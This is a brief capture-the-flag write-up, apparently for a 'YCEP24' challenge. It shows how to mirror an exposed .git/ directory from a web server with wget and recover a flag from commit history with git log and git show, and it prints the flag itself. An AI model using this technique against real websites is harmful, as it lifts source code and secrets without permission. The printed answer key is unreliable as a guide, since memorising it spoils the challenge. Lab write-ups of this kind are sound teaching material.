# Solution

1. Explore the website will reveal the .git/ folder
* wget -r https://domain-name:port/.git/

2. Move into the folder that contains .git/ (Use ls -la to see hidden file).

3. Run **git log** command

```commit 2872842238b7d9ef6b9baaf47eeb5f764cc7d33c
Author: kiraisha <mahwenqiang185@gmail.com>
Date:   Sat Jun 1 16:25:11 2024 +0800

    Removing unnecessary file

commit 643526e70c30dd74251f6f7e299490dd5f72336c
Author: kiraisha <mahwenqiang185@gmail.com>
Date:   Sat Jun 1 16:24:45 2024 +0800
```

4. Run **git show** to display the commit and get the flag.

```
$ git show 643526e70c30dd74251f6f7e299490dd5f72336c
commit 643526e70c30dd74251f6f7e299490dd5f72336c
Author: kiraisha <mahwenqiang185@gmail.com>
Date:   Sat Jun 1 16:24:45 2024 +0800

    Adding secret notes

diff --git a/flag.txt b/flag.txt
new file mode 100644
index 0000000..9222097
--- /dev/null
+++ b/flag.txt
@@ -0,0 +1 @@
+YCEP24{W3_f0rg3t_t0_s37_f1l3_pE7Miss1i0n_nas8s2n2}
\ No newline at end of file
```

Flag: YCEP24{W3_f0rg3t_t0_s37_f1l3_pE7Miss1i0n_nas8s2n2}